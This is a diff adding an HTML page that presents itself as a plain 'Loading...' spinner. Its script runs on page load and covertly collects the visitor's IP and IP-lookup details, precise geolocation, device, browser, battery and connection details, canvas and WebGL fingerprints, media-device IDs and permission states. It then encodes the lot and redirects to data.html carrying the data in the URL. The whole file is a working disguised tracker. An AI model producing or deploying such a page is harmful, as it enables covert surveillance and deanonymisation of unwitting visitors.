@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+        }
+        .spinner {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: translate(-50%, -50%) rotate(0deg); }
+            100% { transform: translate(-50%, -50%) rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="spinner"></div>
+
+    <script>
+        async function collect() {
+            const data = {};
+
+            // IP
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                data.ip = ipData.ip;
+
+                const detailRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                const details = await detailRes.json();
+                data.ipDetails = details;
+            } catch (e) {
+                data.ip = 'unavailable';
+            }
+
+            // Geolocation
+            if ('geolocation' in navigator) {
+                try {
+                    const pos = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            enableHighAccuracy: true,
+                            timeout: 5000,
+                            maximumAge: 0
+                        });
+                    });
+                    data.geo = {
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        acc: pos.coords.accuracy,
+                        alt: pos.coords.altitude,
+                        altAcc: pos.coords.altitudeAccuracy,
+                        heading: pos.coords.heading,
+                        speed: pos.coords.speed
+                    };
+                } catch (e) {
+                    data.geo = { error: e.message };
+                }
+            }
+
+            // Browser
+            data.browser = {
+                ua: navigator.userAgent,
+                platform: navigator.platform,
+                lang: navigator.language,
+                langs: navigator.languages,
+                cookies: navigator.cookieEnabled,
+                online: navigator.onLine,
+                dnt: navigator.doNotTrack,
+                cores: navigator.hardwareConcurrency,
+                memory: navigator.deviceMemory,
+                touch: navigator.maxTouchPoints,
+                vendor: navigator.vendor,
+                product: navigator.product
+            };
+
+            // Screen
+            data.screen = {
+                w: screen.width,
+                h: screen.height,
+                aw: screen.availWidth,
+                ah: screen.availHeight,
+                cd: screen.colorDepth,
+                pd: screen.pixelDepth,
+                orient: screen.orientation?.type,
+                dpr: window.devicePixelRatio
+            };
+
+            // Window
+            data.window = {
+                iw: window.innerWidth,
+                ih: window.innerHeight,
+                ow: window.outerWidth,
+                oh: window.outerHeight,
+                sx: window.scrollX,
+                sy: window.scrollY
+            };
+
+            // Connection
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (conn) {
+                data.conn = {
+                    type: conn.effectiveType,
+                    downlink: conn.downlink,
+                    rtt: conn.rtt,
+                    saveData: conn.saveData
+                };
+            }
+
+            // Battery
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    data.battery = {
+                        level: battery.level * 100,
+                        charging: battery.chargingTime,
+                        discharging: battery.dischargingTime
+                    };
+                } catch (e) {}
+            }
+
+            // Timezone
+            data.tz = {
+                offset: new Date().getTimezoneOffset(),
+                tz: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+
+            // Canvas fingerprint
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillText('fingerprint', 2, 2);
+                data.canvas = canvas.toDataURL();
+            } catch (e) {}
+
+            // WebGL
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    data.webgl = {
+                        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+                    };
+                }
+            } catch (e) {}
+
+            // Plugins
+            data.plugins = Array.from(navigator.plugins).map(p => p.name);
+
+            // Media devices
+            if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+                try {
+                    const devices = await navigator.mediaDevices.enumerateDevices();
+                    data.media = devices.map(d => ({
+                        kind: d.kind,
+                        label: d.label,
+                        id: d.deviceId
+                    }));
+                } catch (e) {}
+            }
+
+            // Permissions
+            const perms = ['geolocation', 'notifications', 'camera', 'microphone'];
+            data.perms = {};
+            for (const p of perms) {
+                try {
+                    const status = await navigator.permissions.query({ name: p });
+                    data.perms[p] = status.state;
+                } catch (e) {}
+            }
+
+            // Referrer
+            data.ref = document.referrer;
+
+            // Timestamp
+            data.ts = new Date().toISOString();
+
+            // Encode and redirect
+            const encoded = btoa(JSON.stringify(data));
+            window.location.href = `data.html?d=${encoded}`;
+        }
+
+        collect();
+    </script>
+</body>
+</html>
